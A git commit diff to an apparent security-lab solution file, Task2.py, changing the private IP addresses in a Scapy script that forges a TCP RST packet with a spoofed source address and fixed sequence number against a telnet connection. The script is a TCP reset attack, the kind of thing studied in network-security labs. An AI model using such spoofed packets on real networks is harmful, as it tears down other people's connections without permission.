3a9555fb71bd463691b8d80b0e643a2bfb246118
EmuWarfare <68507214+EmuWarfare@users.noreply.github.com>
2023-05-01 23:42:49 -0400

    Update Task2.py

--- Solutions/Task2.py
+++ Solutions/Task2.py
@@ -6,7 +6,7 @@ source_port = 50204
 sequence = 2106704268
 
 print("Sending RESET Packet ...")
-IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
+IPLayer = IP(src="10.9.0.5", dst="10.9.0.6")
 TCPLayer = TCP(sport=source_port,dport=23,flags="R", seq=sequence)
 pkt = IPLayer/TCPLayer
 pkt.show()
